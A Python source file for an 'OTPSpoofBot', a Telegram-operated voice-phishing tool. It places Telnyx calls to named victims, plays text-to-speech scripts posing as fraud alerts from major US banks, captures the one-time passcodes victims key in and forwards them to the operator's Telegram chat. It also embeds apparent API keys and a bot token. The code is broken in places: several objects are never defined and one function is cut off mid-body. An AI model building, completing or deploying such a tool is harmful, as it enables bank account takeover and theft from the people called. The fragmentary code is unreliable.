import os
import telnyx
from gtts import gTTS
from flask import Flask, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
import json
import time
import io
import base64

# Configuration (loaded from environment variables)
TELNYX_API_KEY = os.getenv("KEY01988D95B4F1049E65CE66F8EEC786B1_w45SH8h3jTS4NldNaHmY86")
TELNYX_PHONE_NUMBER = os.getenv("+1-202-992-7750")
TELEGRAM_BOT_TOKEN = os.getenv("7949464896:AAHGP7jLBUwhUnq6mJOKUuoXLsZ2OJtAfq8")
TELEGRAM_CHAT_ID = os.getenv("7588932538")
TELNYX_CONNECTION_ID = os.getenv("2756508958087710186")
VERCEL_URL = os.getenv("otpbot-delta.vercel.app")  # Your Vercel app URL

# Bank scripts with realistic "1:1" fraud alerts
# In-memory state for calls (non-persistent)
call_states = {}
audio_cache = {}  # Cache audio in-memory to avoid filesystem

# Generate AI voice audio in-memory
def generate_audio(text, call_id, phase):
    tts = gTTS(text=text, lang='en')
    buffer = io.BytesIO()
    tts.write_to_fp(buffer)
    buffer.seek(0)
    audio_data = buffer.read()
    audio_key = f"{call_id}_phase{phase}"
    audio_cache[audio_key] = base64.b64encode(audio_data).decode('utf-8')
    return audio_key

# Clean up in-memory audio cache
def cleanup_audio_cache():
    current_time = time.time()
    expired_keys = [key for key, _ in audio_cache.items() if key.split('_')[1].startswith('phase') and current_time - int(key.split('_')[0].split('_')[1]) > 3600]
    for key in expired_keys:
        audio_cache.pop(key, None)

# Serve audio from cache
@app.route('/audio/<audio_key>')
def serve_audio(audio_key):
    audio_data = audio_cache.get(audio_key)
    if not audio_data:
        return "Audio not found", 404
    return Response(base64.b64decode(audio_data), mimetype='audio/mp3')

# Start command
def start(update: Update, context: CallbackContext):
    update.message.reply_text(
        "Welcome to OTPSpoofBot! Commands: /call to start a new call, /status to check bot status."
    )

# Status command to view active calls
def status(update: Update, context: CallbackContext):
    cleanup_audio_cache()
    if not call_states:
        update.message.reply_text("No active calls.")
    else:
        status_msg = "Active Calls:\n"
        keyboard = []
        for call_id, state in call_states.items():
            victim_number = call_id.split('_')[0]
            status_msg += (f"Call ID: {call_id[-8:]}\n"
                           f"Victim: {context.user_data.get('victim_name', 'Unknown')}\n"
                           f"Number: {victim_number}\n"
                           f"Bank: {state['bank'].capitalize()}\n"
                           f"Phase: {state['phase']}\n"
                           f"On Hold: {state['on_hold']}\n"
                           f"OTP: {state['otp'] if state['otp'] else 'Not received'}\n\n")
            keyboard.append([InlineKeyboardButton(f"Stop Call {call_id[-8:]}", callback_data=f"stop_{call_id}")])
        status_msg += f"Audio Cache Size: {len(audio_cache)} entries\n"
        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
        update.message.reply_text(status_msg, reply_markup=reply_markup)

# Call command to input victim details
def call(update: Update, context: CallbackContext):
    update.message.reply_text(
        "Enter victim name and phone number (format: Name,+1XXXXXXXXXX):"
    )
    context.user_data['awaiting_input'] = True

# Handle victim input
def handle_input(update: Update, context: CallbackContext):
    if context.user_data.get('awaiting_input'):
        try:
            name, number = update.message.text.split(',')
            context.user_data['victim_name'] = name.strip()
            context.user_data['victim_number'] = number.strip()
            context.user_data['awaiting_input'] = False
            keyboard = [
                [InlineKeyboardButton("Chase", callback_data='chase'),
                 InlineKeyboardButton("Wells Fargo", callback_data='wellsfargo')],
                [InlineKeyboardButton("Bank of America", callback_data='bofa'),
                 InlineKeyboardButton("Capital One", callback_data='capitalone')],
                [InlineKeyboardButton("Truist", callback_data='truist'),
                 InlineKeyboardButton("PNC", callback_data='pnc')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"Hi {name}, select a bank:", reply_markup=reply_markup)
        except ValueError:
            update.message.reply_text("Invalid format. Use: Name,+1XXXXXXXXXX")

# Handle bank selection and initiate call
def bank_selected(update: Update, context: CallbackContext):
    query = update.callback_query
    bank = query.data
    victim_name = context.user_data['victim_name']
    victim_number = context.user_data['victim_number']
    call_id = f"{victim_number}_{int(time.time())}"
    call_states[call_id] = {'phase': 1, 'bank': bank, 'on_hold': False, 'otp': None}

    # Generate phase 1 audio
    script = BANK_SCRIPTS[bank]['phase1']
    personalized_script = f"Hi {victim_name}, {script}"
    audio_key = generate_audio(personalized_script, call_id, 1)

    # Initiate call
    call = telnyx.Call.create(
        connection_id=TELNYX_CONNECTION_ID,
        to=victim_number,
        from_=TELNYX_PHONE_NUMBER,
        audio_url=f"{VERCEL_URL}/audio/{audio_key}"
    )
    call_states[call_id]['call_id'] = call.call_control_id

    keyboard = [
        [InlineKeyboardButton("Next Phase", callback_data=f"next_{call_id}"),
         InlineKeyboardButton("Hold", callback_data=f"hold_{call_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    query.message.reply_text(f"Call initiated to {victim_name} ({victim_number}) for {bank}. Phase 1 playing.", reply_markup=reply_markup)

# Handle call control (next phase, hold, stop)
        audio_key = generate_audio(script, call_id, state['phase'])

        # Play next phase
        telnyx.Call.control(
            call_control_id=state['call_id'],
            command="play",
            audio_url=f"{VERCEL_URL}/audio/{audio_key}"
        )
        query.message.reply_text(f"Playing phase {state['phase']} for {state['bank']}.")
        if state['phase'] == 2:
            query.message.reply_text("Waiting for DTMF input (OTP).")
        keyboard = [
            [InlineKeyboardButton("Next Phase", callback_data=f"next_{call_id}"),
             InlineKeyboardButton("Hold", callback_data=f"hold_{call_id}")]
        ]
        query.message.reply_text("Select action:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif action == "stop":
        telnyx.Call.control(call_control_id=state['call_id'], command="hangup")
        query.message.reply_text(f"Call {call_id[-8:]} stopped.")
        del call_states[call_id]

# Telegram webhook route
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = Update.de_json(request.get_json(force=True), updater.bot)
    dp.process_update(update)
    return '', 200

# Telnyx webhook to handle DTMF
@app.route('/telnyx_webhook', methods=['POST'])
def telnyx_webhook():
    data = request.json
    if data['data']['event_type'] == 'call.dtmf.received':
        call_id = data['data']['call_control_id']
        dtmf = data['data']['payload']['digit']
        for cid, state in call_states.items():
            if state['call_id'] == call_id and state['phase'] == 2:
                state['otp'] = dtmf
                updater.bot.send_message(
                    chat_id=TELEGRAM_CHAT_ID,
                    text=f"OTP received: {dtmf}"
                )
    return '', 200

# Set up Telegram handlers
dp.add_handler(CommandHandler('start', start))
dp.add_handler(CommandHandler('call', call))
dp.add_handler(CommandHandler('status', status))
dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_input))
dp.add_handler(CallbackQueryHandler(control_call))

# Vercel serverless function entry point
def handler(event, context):
    return app(event, context)
